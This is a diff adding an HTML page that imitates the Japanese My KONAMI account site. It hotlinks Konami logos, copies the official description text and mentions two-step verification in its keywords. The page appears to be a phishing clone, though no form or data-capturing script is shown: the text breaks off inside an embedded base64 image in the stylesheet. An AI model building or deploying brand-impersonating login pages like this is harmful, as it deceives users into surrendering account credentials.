@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+         
+		<link href="/common/css/bootstrap.css" rel="stylesheet" />
+		<link href="/common/css/bootstrap-mykonami.css?v=1" rel="stylesheet" />
+		<link href="/common/css/bootstrap-responsive.css" rel="stylesheet" />
+		<link href="/common/css/site.css" rel="stylesheet" />
+		<link rel="apple-touch-icon-precomposed" href="/common/img/sp/apple-touch-icon-precomposed.png" />
+	
+
+     <link rel="icon" href="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBw8NDQ0NDQ0NDQ0NDQ0NDQ0NDQ8NDQ0NFREWFhURFRUYHSggGBomJxUWITEhJikrLi4vFx80ODMtNyg5LisBCgoKDg0OGxAQFSslHyYtLystLSstLS0tLi0uLS0tKysrLSstLS0tLysrLSstLSstLSsrLSsrKystKy0uLS0tLf/AABEIAKgBKwMBIgACEQEDEQH/xAAcAAEAAwADAQEAAAAAAAAAAAAAAQYHBAUIAgP/xABFEAABAwICBgYGBgkCBwAAAAABAAIDBBEFIQYHEjFBURMUYXGBkSIyNXOCsiNicqGxszM0QlJ0krTB8BXhJUNTg8LR0v/EABsBAQACAwEBAAAAAAAAAAAAAAACBAEDBQYH/8QAOhEAAgECAwQGBwUJAAAAAAAAAAECAxEEEiEFMUFRE2FxgZGxFCJyocHR8CMyQuHxFSUzNDVDUoLC/9oADAMBAAIRAxEAPwCgIilc4+jkIiICUREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREBCKUQEIpRAQilQgCKVCAKURAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAQiIgJREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAERQgJRFCAlFCICVCKUBCIiAKVCeBQEoljyPkiGQiKLHkfJBYlERDARfcUL3mzGvceTWlx8gvuakljzkieB9eN7fxS6HGx+KKFKAIluxLHkfJDNmEREMBEARAERR4FASiW7CiAIiIAiix5HyUoZsERLIYIRFKAhFNjyPkoQzYIpUIYCIiAlFCICVatWz2HE4YJIYJoqgvZIyeGOVosHODmhw9E3HBVRWfVr7ZoveyfIVmO9FfGK+Hqey/I2THdFqCSlnHUqaMiGRzZIoI45GODSQQ5ouvOjt57yvUuK/q1R7ib5CsW1faCur3iqqmujo43mwza6dwPqt5DmfAdm6tC8koo4Wx8UqVGpOrLRNeT0XWz89ANBn4i9tRUh0dGx+Zza+dw/Yb9XmfAZ7r/pfU4ThMIc6goX1D22hg6tDtOtltONsmjnxXJ0v0rp8Gp2xRBpn2A2CmZYNjZawc4Dc0cuP3jC8UxKarmdPUSOkkebu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" type="image/gif" sizes="16x16">
+     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <meta charset="UTF-8" />
+    <meta name="description" content="KONAMI IDはコナミグループが提供するサービスをご利用いただく為の、あなた専用のIDです。My KONAMI（マイコナミ）より無料でご登録・ご利用いただけます。" />
+    <meta name="keywords" content="KONAMI ID, My KONAMI, eAMUSEMENT, PASELI,konami.pes two step verification" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My KONAMI</title>
+</head>
+<body>
+  <header class="bg-light">
+     
+        <img src="https://my.konami.net/common/img/logo-konami.png">
+        <br>
+        <div class="bg-danger">
+        <img src="https://my.konami.net/common/img/logo-mykonami.png" alt="My Konami" al center>
+        </div>
+        
+        <style>
+               
+            body {
+                background-color:#E7E9EB;
+            }
+            #myDIV {
+              height:300px;
+              background-color:#ffffff;
+              padding: 20px;
+              border: 1px solid black;
+              border: top left radius 1px;
+              background-image:url(data:image/png;base64,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